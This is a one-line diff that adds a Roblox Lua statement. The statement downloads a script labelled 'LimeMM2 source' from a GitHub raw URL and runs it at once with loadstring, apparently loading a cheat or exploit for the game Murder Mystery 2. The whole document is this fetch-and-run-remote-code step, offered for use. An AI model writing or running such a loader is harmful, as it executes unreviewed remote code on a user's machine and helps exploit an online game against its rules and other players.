@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LimeScripts/source-bimbimbambam/refs/heads/main/LimeMM2%20source.txt"))()
